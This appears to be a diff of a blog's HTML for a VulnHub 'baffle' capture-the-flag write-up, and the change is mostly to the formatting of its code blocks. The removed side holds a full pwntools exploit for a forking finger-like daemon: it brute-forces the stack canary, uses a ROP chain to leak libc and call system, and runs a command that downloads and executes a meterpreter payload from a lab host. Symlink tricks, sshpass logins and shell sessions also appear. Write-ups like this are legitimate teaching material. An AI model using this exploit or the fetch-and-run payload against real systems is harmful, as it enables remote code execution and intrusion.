-| |   | | (_| | (_| |/ , . \\ \_/ / (_| | |_| | | |_
-\_|   |_|\__,_|\__, |\/|_|\/ \___/ \__,_|\__,_|_|\__|
-                __/ |
-               |___/
-
-ENTER YOUR AUTHENTICATION CODE: test
-CHECKING CODE... CODE IS VALID
-DATA: FLAG{tr3each3ry_anD_cUnn1ng}
-</code></pre><p>Using the same trick we can also get the password required by the binary:</p>
-<pre tabindex="0"><code>ln -fs /home/bob/filez/auth.txt /home/alice/flag.txt
-$ ./flag_vault
-______ _                _    _   _             _ _
-|  ___| |            /\| |/\| | | |           | | |
-| |_  | | __ _  __ _ \ ` &#39; /| | | | __ _ _   _| | |_
-|  _| | |/ _` |/ _` |_     _| | | |/ _` | | | | | __|
-| |   | | (_| | (_| |/ , . \\ \_/ / (_| | |_| | | |_
-\_|   |_|\__,_|\__, |\/|_|\/ \___/ \__,_|\__,_|_|\__|
-                __/ |
-               |___/
-
-ENTER YOUR AUTHENTICATION CODE: test
-CHECKING CODE... CODE IS VALID
-DATA: we_seek_after_knowledge_and_you_call_us_criminals
-</code></pre><h1 id="vulnhub">vulnhub</h1>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>cd /home/alice/
+</span></span><span style="display:flex;"><span>echo test &gt; auth.txt
+</span></span><span style="display:flex;"><span>ln -s /home/bob/filez/flag.txt /home/alice/flag.txt
+</span></span><span style="display:flex;"><span>ln -s /home/bob/filez/flag_vault /home/alice/flag_vault
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>$ ./flag_vault
+</span></span><span style="display:flex;"><span>______ _                _    _   _             _ _
+</span></span><span style="display:flex;"><span>|  ___| |            /\| |/\| | | |           | | |
+</span></span><span style="display:flex;"><span>| |_  | | __ _  __ _ \ ` &#39; /| | | | __ _ _   _| | |_
+</span></span><span style="display:flex;"><span>|  _| | |/ _` |/ _` |_     _| | | |/ _` | | | | | __|
+</span></span><span style="display:flex;"><span>| |   | | (_| | (_| |/ , . \\ \_/ / (_| | |_| | | |_
+</span></span><span style="display:flex;"><span>\_|   |_|\__,_|\__, |\/|_|\/ \___/ \__,_|\__,_|_|\__|
+</span></span><span style="display:flex;"><span>                __/ |
+</span></span><span style="display:flex;"><span>               |___/
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>ENTER YOUR AUTHENTICATION CODE: test
+</span></span><span style="display:flex;"><span>CHECKING CODE... CODE IS VALID
+</span></span><span style="display:flex;"><span>DATA: FLAG{tr3each3ry_anD_cUnn1ng}
+</span></span></code></pre></div><p>Using the same trick we can also get the password required by the binary:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>ln -fs /home/bob/filez/auth.txt /home/alice/flag.txt
+</span></span><span style="display:flex;"><span>$ ./flag_vault
+</span></span><span style="display:flex;"><span>______ _                _    _   _             _ _
+</span></span><span style="display:flex;"><span>|  ___| |            /\| |/\| | | |           | | |
+</span></span><span style="display:flex;"><span>| |_  | | __ _  __ _ \ ` &#39; /| | | | __ _ _   _| | |_
+</span></span><span style="display:flex;"><span>|  _| | |/ _` |/ _` |_     _| | | |/ _` | | | | | __|
+</span></span><span style="display:flex;"><span>| |   | | (_| | (_| |/ , . \\ \_/ / (_| | |_| | | |_
+</span></span><span style="display:flex;"><span>\_|   |_|\__,_|\__, |\/|_|\/ \___/ \__,_|\__,_|_|\__|
+</span></span><span style="display:flex;"><span>                __/ |
+</span></span><span style="display:flex;"><span>               |___/
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>ENTER YOUR AUTHENTICATION CODE: test
+</span></span><span style="display:flex;"><span>CHECKING CODE... CODE IS VALID
+</span></span><span style="display:flex;"><span>DATA: we_seek_after_knowledge_and_you_call_us_criminals
+</span></span></code></pre></div><h2 id="vulnhub">vulnhub<a href="#vulnhub" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h2>
 <p>This one was the hardest challenge on baffle for me.</p>
 <p>We can use bob&rsquo;s flag as a password for the user <code>bob</code> and ssh into the machine.</p>
-<pre tabindex="0"><code>sshpass -p tr3each3ry_anD_cUnn1ng ssh bob@192.168.56.2
-</code></pre><p>The binary <code>/home/bob/binz/ctfingerd</code> is running on localhost port 7979 under the user <code>vulnhub</code>. So we pull the binary to our machine and start analyzing it.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>sshpass -p tr3each3ry_anD_cUnn1ng ssh bob@192.168.56.2
+</span></span></code></pre></div><p>The binary <code>/home/bob/binz/ctfingerd</code> is running on localhost port 7979 under the user <code>vulnhub</code>. So we pull the binary to our machine and start analyzing it.</p>
 <p><img src="/img/vulnhub_dc416_baffle/binaryninja_ctfingerd_query_user.png" alt="binaryninja"></p>
 <p>In the disassembling of the <code>query_user</code> function we can see a <code>memset</code> of 1000 bytes is done for the user input but the <code>read</code> call reads up to 2000 bytes resulting in an overflow of the buffer. The binary itself has NX and stack canaries enabled so we can not simply overflow the stack as the stack canary would become invalid and terminate the process.</p>
-<pre tabindex="0"><code>gdb-peda$ checksec
-CANARY    : ENABLED
-FORTIFY   : disabled
-NX        : ENABLED
-PIE       : disabled
-RELRO     : disabled
-</code></pre><p>The main process of the <code>ctfingerd</code> binary calls <code>fork</code> after accepting a connection to handle the data sent to it. When doing a <code>fork</code> the whole memory content is shared with the subprocess. As the Stack Canary is calculated only once at program start and stays the same as long as the main process is active we might be able to bruteforce the canary byte by byte. You can read more about this topic in <a href="http://phrack.org/issues/67/13.html">Phrack Issue 67</a>.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>gdb-peda$ checksec
+</span></span><span style="display:flex;"><span>CANARY    : ENABLED
+</span></span><span style="display:flex;"><span>FORTIFY   : disabled
+</span></span><span style="display:flex;"><span>NX        : ENABLED
+</span></span><span style="display:flex;"><span>PIE       : disabled
+</span></span><span style="display:flex;"><span>RELRO     : disabled
+</span></span></code></pre></div><p>The main process of the <code>ctfingerd</code> binary calls <code>fork</code> after accepting a connection to handle the data sent to it. When doing a <code>fork</code> the whole memory content is shared with the subprocess. As the Stack Canary is calculated only once at program start and stays the same as long as the main process is active we might be able to bruteforce the canary byte by byte. You can read more about this topic in <a href="http://phrack.org/issues/67/13.html">Phrack Issue 67</a>.</p>
 <p>Once the forked process returns the main process prints the string <code>---\n</code>. If the canary is invalid the forked process crashes and does not return, so the <code>---\n</code> string is never printed. This way we know that if we guessed a valid stack canary or not.</p>
 <p>Screenshot of the stack canary check and the fact that there is no return on fail:</p>
 <p><img src="/img/vulnhub_dc416_baffle/binaryninja_ctfingerd_canary.png" alt="binaryninja"></p>
@@ -636,372 +715,394 @@ RELRO     : disabled
 <p>As the address on the stack right after the canary is the return address we have control over where to forked process returns.</p>
 <p>The binary contains a <code>PLT (Procedure Linkage Table)</code> and a <code>GOT (Global Offsets Table)</code>. What they are for in detail can be read up <a href="https://www.technovelty.org/linux/plt-and-got-the-key-to-code-sharing-and-dynamic-libraries.html">here</a>. As we have the <code>write</code> function available and the program prints out it&rsquo;s file descriptor on every connect we can craft a ROP chain to write the effective libc address of <code>read</code> obtained from <code>GOT</code> to the file descriptor (we could use any of the available <code>GOT</code> stubs). After leaking the address we can calculate the exact memory location of <code>system</code>, prepare the parameters and jump to this address.</p>
 <p>We can copy the libc binary from the machine using our SSH access and get the offset from <code>read</code> and calculate libc&rsquo;s base address.</p>
-<pre tabindex="0"><code>bob@baffle:~/binz$ ldd ctfingerd
-	linux-vdso.so.1 (0x00007ffc517b9000)
-	libc.so.6 =&gt; /lib/x86_64-linux-gnu/libc.so.6 (0x00007f5cbc719000)
-	/lib64/ld-linux-x86-64.so.2 (0x00007f5cbcac4000)
-bob@baffle:~/binz$ ls -al /lib/x86_64-linux-gnu/libc.so.6
-  lrwxrwxrwx 1 root root 12 Sep  5 02:09 /lib/x86_64-linux-gnu/libc.so.6 -&gt; libc-2.19.so
-</code></pre><p>To calculate the offsets we first need to get the location of the <code>read</code> and the <code>system</code> function.</p>
-<pre tabindex="0"><code>root@kali:~/baffle# readelf -s libc-2.19.so | grep read@
-   534: 00000000000dbb90    90 FUNC    WEAK   DEFAULT   12 __read@@GLIBC_2.2.5
-   657: 0000000000074890    27 FUNC    GLOBAL DEFAULT   12 _IO_file_read@@GLIBC_2.2.5
-   883: 00000000000dbb90    90 FUNC    WEAK   DEFAULT   12 read@@GLIBC_2.2.5
-  1082: 00000000000df390  1411 FUNC    GLOBAL DEFAULT   12 fts_read@@GLIBC_2.2.5
-  1175: 00000000000e8900    31 FUNC    GLOBAL DEFAULT   12 eventfd_read@@GLIBC_2.7
-  1572: 000000000006a460   320 FUNC    WEAK   DEFAULT   12 fread@@GLIBC_2.2.5
-  2018: 00000000000da3a0    96 FUNC    WEAK   DEFAULT   12 pread@@GLIBC_2.2.5
-  2134: 000000000006a460   320 FUNC    GLOBAL DEFAULT   12 _IO_fread@@GLIBC_2.2.5
-root@kali:~/baffle# readelf -s libc-2.19.so | grep system@
-   577: 0000000000041490    45 FUNC    GLOBAL DEFAULT   12 __libc_system@@GLIBC_PRIVATE
-  1337: 0000000000041490    45 FUNC    WEAK   DEFAULT   12 system@@GLIBC_2.2.5
-</code></pre><p>So the <code>read</code> function is located at offset <code>0x00000000000dbb90</code> and <code>system</code> at offset <code>0x0000000000041490</code>. We now need to subtract the <code>read</code> value from the leaked libc address to get the base address of libc in memory. If we then add <code>0x0000000000041490</code> to the calculated base address we get the exact location of <code>system</code> on the target machine.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>bob@baffle:~/binz$ ldd ctfingerd
+</span></span><span style="display:flex;"><span>    linux-vdso.so.1 (0x00007ffc517b9000)
+</span></span><span style="display:flex;"><span>    libc.so.6 =&gt; /lib/x86_64-linux-gnu/libc.so.6 (0x00007f5cbc719000)
+</span></span><span style="display:flex;"><span>    /lib64/ld-linux-x86-64.so.2 (0x00007f5cbcac4000)
+</span></span><span style="display:flex;"><span>bob@baffle:~/binz$ ls -al /lib/x86_64-linux-gnu/libc.so.6
+</span></span><span style="display:flex;"><span>  lrwxrwxrwx 1 root root 12 Sep  5 02:09 /lib/x86_64-linux-gnu/libc.so.6 -&gt; libc-2.19.so
+</span></span></code></pre></div><p>To calculate the offsets we first need to get the location of the <code>read</code> and the <code>system</code> function.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>root@kali:~/baffle# readelf -s libc-2.19.so | grep read@
+</span></span><span style="display:flex;"><span>   534: 00000000000dbb90    90 FUNC    WEAK   DEFAULT   12 __read@@GLIBC_2.2.5
+</span></span><span style="display:flex;"><span>   657: 0000000000074890    27 FUNC    GLOBAL DEFAULT   12 _IO_file_read@@GLIBC_2.2.5
+</span></span><span style="display:flex;"><span>   883: 00000000000dbb90    90 FUNC    WEAK   DEFAULT   12 read@@GLIBC_2.2.5
+</span></span><span style="display:flex;"><span>  1082: 00000000000df390  1411 FUNC    GLOBAL DEFAULT   12 fts_read@@GLIBC_2.2.5
+</span></span><span style="display:flex;"><span>  1175: 00000000000e8900    31 FUNC    GLOBAL DEFAULT   12 eventfd_read@@GLIBC_2.7
+</span></span><span style="display:flex;"><span>  1572: 000000000006a460   320 FUNC    WEAK   DEFAULT   12 fread@@GLIBC_2.2.5
+</span></span><span style="display:flex;"><span>  2018: 00000000000da3a0    96 FUNC    WEAK   DEFAULT   12 pread@@GLIBC_2.2.5
+</span></span><span style="display:flex;"><span>  2134: 000000000006a460   320 FUNC    GLOBAL DEFAULT   12 _IO_fread@@GLIBC_2.2.5
+</span></span><span style="display:flex;"><span>root@kali:~/baffle# readelf -s libc-2.19.so | grep system@
+</span></span><span style="display:flex;"><span>   577: 0000000000041490    45 FUNC    GLOBAL DEFAULT   12 __libc_system@@GLIBC_PRIVATE
+</span></span><span style="display:flex;"><span>  1337: 0000000000041490    45 FUNC    WEAK   DEFAULT   12 system@@GLIBC_2.2.5
+</span></span></code></pre></div><p>So the <code>read</code> function is located at offset <code>0x00000000000dbb90</code> and <code>system</code> at offset <code>0x0000000000041490</code>. We now need to subtract the <code>read</code> value from the leaked libc address to get the base address of libc in memory. If we then add <code>0x0000000000041490</code> to the calculated base address we get the exact location of <code>system</code> on the target machine.</p>
 <p>As this binary is x64 we can not simply put the arguments for the call to <code>system</code> on the stack, instead we need to pass them through registers.</p>
 <p>On x64 parameters are passed the following way (a list of system calls on x64 can be found <a href="http://blog.rchapman.org/posts/Linux_System_Call_Table_for_x86_64/">here</a>):</p>
-<pre tabindex="0"><code>function_call(%rax) = function(%rdi,  %rsi,  %rdx,  %r10,  %r8,  %r9)
-               ^system          ^arg1  ^arg2  ^arg3  ^arg4  ^arg5 ^arg6
-                call #
-</code></pre><p>The binary itself has only a few ROP gadgets available so I used a few ones from libc as we now have the base address but I tried to mostly use gadgets from the binary itself.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>function_call(%rax) = function(%rdi,  %rsi,  %rdx,  %r10,  %r8,  %r9)
+</span></span><span style="display:flex;"><span>               ^system          ^arg1  ^arg2  ^arg3  ^arg4  ^arg5 ^arg6
+</span></span><span style="display:flex;"><span>                call #
+</span></span></code></pre></div><p>The binary itself has only a few ROP gadgets available so I used a few ones from libc as we now have the base address but I tried to mostly use gadgets from the binary itself.</p>
 <p>We can now create a rop chain to put the desired values in the registers, call system and watch our command be executed. I decided to call another read from the socket and put my command into the <code>.dynamic</code> section of the binary in memory and then call system with this address.</p>
 <p>To test the exploit locally we need to adjust the offsets as the libc version differs with the one from the VM. Also the networking code of the binary is really crappy as it never releases a socket resulting in <code>too many open files</code> error messages when running against the VM. In that case a simple VM reset helps :) But the case that we have to bruteforce the canary on each run and the crappy socket handling makes debugging this binary a pain in the ass - thanks <a href="https://twitter.com/superkojiman">@superkojiman</a> :D</p>
 <p>We can expose the local port on our machine by using a SSH port forward and executing the script again - this should get us a shell:</p>
-<pre tabindex="0"><code>sshpass -p tr3each3ry_anD_cUnn1ng ssh -L 7979:localhost:7979 bob@192.168.56.2
-</code></pre><p>Final output of the exploit:</p>
-<pre tabindex="0"><code>root@kali:~/baffle# ./ctfingerd.py
-[+] Found part 1/8 of stack canary: 0x0
-[+] Found part 2/8 of stack canary: 0x19
-[+] Found part 3/8 of stack canary: 0xfb
-[+] Found part 4/8 of stack canary: 0x13
-[+] Found part 5/8 of stack canary: 0x6b
-[+] Found part 6/8 of stack canary: 0xc8
-[+] Found part 7/8 of stack canary: 0x35
-[+] Found part 8/8 of stack canary: 0x96
-[+] Stack Canary is \x00\x19\xfb\x13\x6b\xc8\x35\x96
-[*] read@got: 0x6014f8
-[*] leak fd: 817
-[*] Sending leak payload ...
-[*] leaked read address: 0x7f4379fa1b90
-[*] libc base: 0x7f4379ec6000
-[*] system: 0x7f4379f07490
-[*] fd: 818
-[*] Paused (press any to continue)
-</code></pre><pre tabindex="0"><code>meterpreter &gt; sysinfo
-Computer     : 192.168.56.2
-OS           : Debian 8.6 (Linux 3.16.0-4-amd64)
-Architecture : x64
-Meterpreter  : x86/linux
-
-meterpreter &gt; getuid
-Server username: uid=1000, gid=1000, euid=1000, egid=1000
-</code></pre><pre tabindex="0"><code>python -c &#39;import pty; pty.spawn(&#34;/bin/sh&#34;)&#39;
-$ id
-id
-uid=1000(vulnhub) gid=1000(vulnhub) groups=1000(vulnhub),24(cdrom),25(floppy),27(sudo),29(audio),30(dip),44(video),46(plugdev),108(netdev)
-$ cat flag.txt
-Sorry Mario. The flag is in another castle.
-$ ls -alh
-ls -alh
-total 40K
-drwx------ 3 vulnhub vulnhub 4.0K Oct 25 16:49 .
-drwxr-xr-x 6 root    root    4.0K Oct 20 03:38 ..
--rw------- 1 vulnhub vulnhub    0 Oct 20 03:28 .bash_history
--rw-r--r-- 1 vulnhub vulnhub  220 Sep 12 15:05 .bash_logout
--rw-r--r-- 1 vulnhub vulnhub 3.5K Sep 12 15:05 .bashrc
--rw-r--r-- 1 vulnhub vulnhub   45 Oct 25 16:49 flag.txt
--rw-r--r-- 1 vulnhub vulnhub  462 Jan  2 16:00 log.txt
-drwxr-xr-x 2 root    root    4.0K Oct 25 16:46 .my_loot
--rw-r--r-- 1 vulnhub vulnhub  675 Sep 12 15:05 .profile
--rwx------ 1 vulnhub vulnhub  297 Oct 20 03:21 run_service.sh
--rw-r--r-- 1 vulnhub vulnhub   74 Oct 20 02:08 .selected_editor
-$ cat .my_loot/flag.txt
-cat .my_loot/flag.txt
-
-
-        !!! CONGRATULATIONS !!!
-
-                 .-&#34;-.
-                / 4 4 \
-                \_ v _/
-                //   \\
-               ((     ))
-         =======&#34;&#34;===&#34;&#34;=======
-                  |||
-                  &#39;|&#39;
-
-      FLAG{i_tot_i_saw_a_puddy_tat}
-</code></pre><p>Code:</p>
-<pre tabindex="0"><code>#!/usr/bin/env python2
-
-from pwn import *
-import re
-import sys
-
-context(bits=64,
-        os=&#34;linux&#34;,
-        aslr=False,
-        #log_level=&#34;DEBUG&#34;,
-        terminal=[&#34;tmux&#34;, &#34;splitw&#34;, &#34;-l&#34;, &#34;45&#34;])
-
-if len(sys.argv) &gt; 1:
-    local = True
-else:
-    local = False
-
-if local:
-    p_main = process(&#34;./ctfingerd&#34;)
-
-def encode_payload(p):
-    return &#34;&#34;.join(&#34;\\x{:02x}&#34;.format(ord(c)) for c in p)
-
-def send_content(content):
-    t = 1 if local else 2
-    with context.quiet:
-        p = None
-        try:
-            p = remote(&#34;127.0.0.1&#34;, 7979)
-            temp = p.recvuntil(&#34;User to query: &#34;, timeout=t)
-            m = re.search(r&#34;Socket fd: ([0-9]+)&#34;, temp)
-            if m:
-                log.info(&#34;FD: {}&#34;.format(m.group(1)))
-                fd = int(m.group(1))
-            p.send(content)
-            p.recvuntil(&#34;Checking...\n&#34;, timeout=t)
-            content = p.recv(timeout=t)
-            content = content.strip()
-            return content
-        finally:
-            if p:
-                p.close()
-            if local:
-                p_main.recv()
-    return None
-
-def brute_next_canary_value(stack):
-    for x in xrange(0, 256):
-        payload = stack + chr(x)
-        retval = send_content(payload)
-        if retval is None:
-            log.error(&#34;something has gone wrong&#34;)
-        if &#34;---&#34; in retval:
-            return x
-    log.error(&#34;Can not find next canary&#34;)
-    return None
-
-
-def leak_address(address):
-    with context.quiet:
-        p = remote(&#34;127.0.0.1&#34;, 7979)
-    temp = p.recvuntil(&#34;User to query: &#34;)
-    m = re.search(r&#34;Socket fd: ([0-9]+)&#34;, temp)
-    fd = int(m.group(1))
-    log.info(&#34;leak fd: {}&#34;.format(fd))
-
-    payload  = &#34;&#34;
-    payload += user
-    payload += stack_canary
-    payload += p64(dummy) # RBP
-
-    # write:
-    #   rdi: fd
-    #   rsi: buf
-    #   rdx: count
-    # rdx is 0x25 from previous calls
-    payload += p64(pop_rsi_pop_r15_ret)
-    payload += p64(address)
-    payload += p64(dummy)
-    payload += p64(pop_rdi_ret)
-    payload += p64(fd)
-    payload += p64(write_plt)
-    payload += p64(dummy)
-
-    log.info(&#34;Sending leak payload ...&#34;)
-    p.send(payload)
-    p.recvuntil(&#34;Checking...\n&#34;)
-    c = p.recv()
-    with context.quiet:
-        p.close()
-    # only take the last RDX bytes, the rest is the plan file or error message
-    c = c[-37:]
-
-    # trim to 8 bytes as we received more bytes
-    leak = c[:8]
-    leak = unpack(leak, &#34;all&#34;)
-    return leak
-
-
-stack_len = 1000
-
-user  = &#34;A&#34; * 20
-user += &#34;\x0a&#34;
-user += &#34;A&#34; * (stack_len - len(user))
-
-stack_canary = &#34;&#34;
-for a in xrange(1, 9):
-    ret = brute_next_canary_value(user + stack_canary)
-    log.success(&#34;Found part {}/8 of stack canary: {:#02x}&#34;.format(a, ret))
-    stack_canary += chr(ret)
-
-log.success(&#34;Stack Canary is {}&#34;.format(encode_payload(stack_canary)))
-
-dummy = 0xdeadbeefdeadbeef
-pop_rdi_ret = 0x401013 # pop rdi; ret
-pop_rsi_pop_r15_ret = 0x0401011 # pop rsi ; pop r15 ; ret
-
-with context.quiet:
-    b = ELF(&#34;./ctfingerd&#34;)
-read_got = b.got[&#34;read&#34;]
-write_plt = b.plt[&#34;write&#34;]
-log.info(&#34;read@got: {:#08x}&#34;.format(read_got))
-
-leak = leak_address(read_got)
-
-log.info(&#34;leaked read address: {:#08x}&#34;.format(leak))
-
-if local:
-    # local libc version 2.24
-    offset_read = 0xdb5b0
-    offset_system = 0x3f460
-    # xor rax, rax ; ret
-    offset_xor_rax_rax = 0x80615
-    # syscall ; ret
-    offset_syscall = 0xa85f5
-    # pop rdx ; ret
-    offset_pop_rdx = 0x1b92
-else:
-    # remote libc version 2.19
-    offset_read = 0x0dbb90
-    offset_system = 0x41490
-    # xor rax, rax ; ret
-    offset_xor_rax_rax = 0x81dd5
-    # syscall ; ret
-    offset_syscall = 0xbade5
-    # pop rdx ; ret
-    offset_pop_rdx = 0x1b8e
-
-
-libc_base = leak - offset_read
-log.info(&#34;libc base: {:#08x}&#34;.format(libc_base))
-
-addr_system = libc_base + offset_system
-log.info(&#34;system: {:#08x}&#34;.format(addr_system))
-
-if local:
-    gdb_cmd = []
-    gdb_cmd.append(&#34;set follow-fork-mode child&#34;)
-    #  gdb_cmd.append(&#34;b *{:#08x}&#34;.format(offset_syscall))
-    #  gdb_cmd.append(&#34;b *{:#08x}&#34;.format(pop_rsi_pop_r15_ret))
-    gdb_cmd.append(&#34;b *{:#08x}&#34;.format(pop_rdi_ret))
-    #  gdb_cmd.append(&#34;b *{:#08x}&#34;.format(addr_system))
-    gdb_cmd.append(&#34;c&#34;)
-    gdb_cmd = &#34;\n&#34;.join(gdb_cmd)
-    #  gdb.attach(p_main, gdb_cmd)
-
-with context.quiet:
-    p = remote(&#34;127.0.0.1&#34;, 7979)
-temp = p.recvuntil(&#34;User to query: &#34;)
-m = re.search(r&#34;Socket fd: ([0-9]+)&#34;, temp)
-fd = int(m.group(1))
-log.info(&#34;fd: {}&#34;.format(fd))
-
-free_space = 0x6012c0 # .dynamic
-command = &#34;/bin/sh -c \&#34;/usr/bin/rm -f /tmp/meterpreter; /usr/bin/wget -O /tmp/meterpreter http://192.168.56.3/meterpreter ; chmod +x /tmp/meterpreter; /tmp/meterpreter\&#34;\x00&#34;;
-
-payload  = &#34;&#34;
-payload += user
-payload += stack_canary
-payload += p64(dummy)
-payload += p64(pop_rdi_ret)
-payload += p64(dummy)
-# read via libc
-# sys_read:
-#   rax: 0
-#   rdi: fd
-#   rsi: *buf
-#   rdx: count
-payload += p64(libc_base + offset_xor_rax_rax)
-payload += p64(pop_rdi_ret)
-payload += p64(fd)
-payload += p64(pop_rsi_pop_r15_ret)
-payload += p64(free_space)
-payload += p64(dummy)
-payload += p64(libc_base + offset_pop_rdx)
-
-payload += p64(len(command))
-payload += p64(libc_base + offset_syscall)
-
-payload += p64(pop_rdi_ret)
-payload += p64(free_space)
-payload += p64(addr_system)
-
-p.send(payload)
-p.recvuntil(&#34;Checking...\n&#34;)
-sleep(1)
-p.send(command)
-p.recv()
-with context.quiet:
-    p.close()
-
-pause()
-
-if local:
-    p_main.close()
-</code></pre><h1 id="charlie">charlie</h1>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>sshpass -p tr3each3ry_anD_cUnn1ng ssh -L 7979:localhost:7979 bob@192.168.56.2
+</span></span></code></pre></div><p>Final output of the exploit:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>root@kali:~/baffle# ./ctfingerd.py
+</span></span><span style="display:flex;"><span>[+] Found part 1/8 of stack canary: 0x0
+</span></span><span style="display:flex;"><span>[+] Found part 2/8 of stack canary: 0x19
+</span></span><span style="display:flex;"><span>[+] Found part 3/8 of stack canary: 0xfb
+</span></span><span style="display:flex;"><span>[+] Found part 4/8 of stack canary: 0x13
+</span></span><span style="display:flex;"><span>[+] Found part 5/8 of stack canary: 0x6b
+</span></span><span style="display:flex;"><span>[+] Found part 6/8 of stack canary: 0xc8
+</span></span><span style="display:flex;"><span>[+] Found part 7/8 of stack canary: 0x35
+</span></span><span style="display:flex;"><span>[+] Found part 8/8 of stack canary: 0x96
+</span></span><span style="display:flex;"><span>[+] Stack Canary is \x00\x19\xfb\x13\x6b\xc8\x35\x96
+</span></span><span style="display:flex;"><span>[*] read@got: 0x6014f8
+</span></span><span style="display:flex;"><span>[*] leak fd: 817
+</span></span><span style="display:flex;"><span>[*] Sending leak payload ...
+</span></span><span style="display:flex;"><span>[*] leaked read address: 0x7f4379fa1b90
+</span></span><span style="display:flex;"><span>[*] libc base: 0x7f4379ec6000
+</span></span><span style="display:flex;"><span>[*] system: 0x7f4379f07490
+</span></span><span style="display:flex;"><span>[*] fd: 818
+</span></span><span style="display:flex;"><span>[*] Paused (press any to continue)
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>meterpreter &gt; sysinfo
+</span></span><span style="display:flex;"><span>Computer     : 192.168.56.2
+</span></span><span style="display:flex;"><span>OS           : Debian 8.6 (Linux 3.16.0-4-amd64)
+</span></span><span style="display:flex;"><span>Architecture : x64
+</span></span><span style="display:flex;"><span>Meterpreter  : x86/linux
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>meterpreter &gt; getuid
+</span></span><span style="display:flex;"><span>Server username: uid=1000, gid=1000, euid=1000, egid=1000
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>python -c &#39;import pty; pty.spawn(&#34;/bin/sh&#34;)&#39;
+</span></span><span style="display:flex;"><span>$ id
+</span></span><span style="display:flex;"><span>id
+</span></span><span style="display:flex;"><span>uid=1000(vulnhub) gid=1000(vulnhub) groups=1000(vulnhub),24(cdrom),25(floppy),27(sudo),29(audio),30(dip),44(video),46(plugdev),108(netdev)
+</span></span><span style="display:flex;"><span>$ cat flag.txt
+</span></span><span style="display:flex;"><span>Sorry Mario. The flag is in another castle.
+</span></span><span style="display:flex;"><span>$ ls -alh
+</span></span><span style="display:flex;"><span>ls -alh
+</span></span><span style="display:flex;"><span>total 40K
+</span></span><span style="display:flex;"><span>drwx------ 3 vulnhub vulnhub 4.0K Oct 25 16:49 .
+</span></span><span style="display:flex;"><span>drwxr-xr-x 6 root    root    4.0K Oct 20 03:38 ..
+</span></span><span style="display:flex;"><span>-rw------- 1 vulnhub vulnhub    0 Oct 20 03:28 .bash_history
+</span></span><span style="display:flex;"><span>-rw-r--r-- 1 vulnhub vulnhub  220 Sep 12 15:05 .bash_logout
+</span></span><span style="display:flex;"><span>-rw-r--r-- 1 vulnhub vulnhub 3.5K Sep 12 15:05 .bashrc
+</span></span><span style="display:flex;"><span>-rw-r--r-- 1 vulnhub vulnhub   45 Oct 25 16:49 flag.txt
+</span></span><span style="display:flex;"><span>-rw-r--r-- 1 vulnhub vulnhub  462 Jan  2 16:00 log.txt
+</span></span><span style="display:flex;"><span>drwxr-xr-x 2 root    root    4.0K Oct 25 16:46 .my_loot
+</span></span><span style="display:flex;"><span>-rw-r--r-- 1 vulnhub vulnhub  675 Sep 12 15:05 .profile
+</span></span><span style="display:flex;"><span>-rwx------ 1 vulnhub vulnhub  297 Oct 20 03:21 run_service.sh
+</span></span><span style="display:flex;"><span>-rw-r--r-- 1 vulnhub vulnhub   74 Oct 20 02:08 .selected_editor
+</span></span><span style="display:flex;"><span>$ cat .my_loot/flag.txt
+</span></span><span style="display:flex;"><span>cat .my_loot/flag.txt
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        !!! CONGRATULATIONS !!!
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>                 .-&#34;-.
+</span></span><span style="display:flex;"><span>                / 4 4 \
+</span></span><span style="display:flex;"><span>                \_ v _/
+</span></span><span style="display:flex;"><span>                //   \\
+</span></span><span style="display:flex;"><span>               ((     ))
+</span></span><span style="display:flex;"><span>         =======&#34;&#34;===&#34;&#34;=======
+</span></span><span style="display:flex;"><span>                  |||
+</span></span><span style="display:flex;"><span>                  &#39;|&#39;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>      FLAG{i_tot_i_saw_a_puddy_tat}
+</span></span></code></pre></div><p>Code:</p>
